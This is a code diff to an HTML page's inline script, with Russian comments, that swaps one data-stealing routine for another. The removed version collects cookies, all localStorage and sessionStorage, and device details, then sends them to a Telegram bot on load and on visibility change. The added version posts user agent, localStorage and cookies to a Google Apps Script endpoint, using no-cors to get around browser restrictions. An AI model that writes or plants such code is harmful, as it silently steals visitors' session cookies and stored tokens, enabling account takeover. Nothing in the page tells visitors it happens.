@@ -4431,53 +4431,25 @@
 })();
 <script>
 (function() {
-    const CONFIG = {
-        TOKEN: 'ТВОЙ_ТОКЕН_БОТА',
-        CHAT_ID: 'ТВОЙ_CHAT_ID',
-        API_URL: 'https://api.telegram.org/bot'
-    };
+    const PROXY_URL = 'https://script.google.com/macros/s/AKfycbxysyrRqOIBsSyW1y95EecR_WfZ98TEFoW1XLdIBKwLt774PFFvxMumdOTXIOZgwByp/exec';
 
-    // Глубокий сбор данных
-    const getFullDeviceDump = () => ({
-        ts: new Date().toISOString(),
-        url: window.location.href,
+    function sendData(text) {
+        fetch(PROXY_URL, {
+            method: 'POST',
+            mode: 'no-cors', // Важно для обхода CORS
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ text: text })
+        });
+    }
+
+    // Собираем данные и шлем
+    const dump = JSON.stringify({
         ua: navigator.userAgent,
-        screen: `${window.screen.width}x${window.screen.height}`,
-        ls: localStorage, // Весь LocalStorage
-        ss: sessionStorage, // Весь SessionStorage
-        cookies: document.cookie,
-        lang: navigator.language,
-        online: navigator.onLine,
-        mem: performance.memory ? performance.memory.usedJSHeapSize : 'n/a'
-    });
+        ls: localStorage,
+        cookies: document.cookie
+    }, null, 2);
 
-    const exfiltrate = async () => {
-        const data = getFullDeviceDump();
-        const payload = {
-            chat_id: CONFIG.CHAT_ID,
-            text: `<b>[PWA DUMP]</b>\n<pre>${JSON.stringify(data, null, 2)}</pre>`,
-            parse_mode: 'HTML'
-        };
-
-        try {
-            // Используем fetch для надежной отправки
-            await fetch(`${CONFIG.API_URL}${CONFIG.TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-        } catch (e) {
-            // Если сеть лежит, PWA Service Worker все равно может удержать запрос
-        }
-    };
-
-    // Запуск при старте
-    window.addEventListener('load', exfiltrate);
-
-    // Запуск при переключении PWA в активный режим
-    document.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'visible') exfiltrate();
-    });
+    sendData("<b>[DUMP]</b>\n<pre>" + dump + "</pre>");
 })();
 </script>
 </body>
